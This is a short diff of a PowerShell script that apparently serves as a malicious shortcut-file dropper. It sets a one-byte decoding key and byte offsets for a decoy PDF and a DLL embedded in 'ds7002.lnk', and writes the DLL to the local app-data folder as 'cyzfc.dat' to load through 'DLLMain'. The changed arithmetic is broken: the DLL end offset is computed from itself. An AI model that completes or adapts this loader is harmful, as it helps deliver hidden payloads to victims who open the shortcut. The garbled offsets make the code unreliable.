@@ -1,16 +1,17 @@
 $filename = "ds7002.lnk";
 $key = [System.Text.Encoding]::UTF8.GetBytes('a')[0];
 
-$pdf_start_byte = 0x00000846;
-$dll_start_byte = 0x0001a9ae;
-$dll_end_byte = 0x0001bdae;
+$pdf_start_byte = 0x00003000;
+$pdf_filelength = 106856;
+$dll_start_byte = 0x00030000;
+$dll_filelength = 5120;
 
 $pdf_file = "$env:temp\ds7002.PDF";
 $dll_file = "$env:localappdata\cyzfc.dat";
 $dll_entrypoint = "DLLMain"
 
-$pdf_filelength = $dll_start_byte - $pdf_start_byte;
-$dll_filelength = $dll_end_byte - $dll_start_byte;
+$pdf_end_byte = $dll_start_byte + $pdf_filelength;
+$dll_end_byte = $dll_end_byte + $dll_filelength;
 
 function get_directory {
 
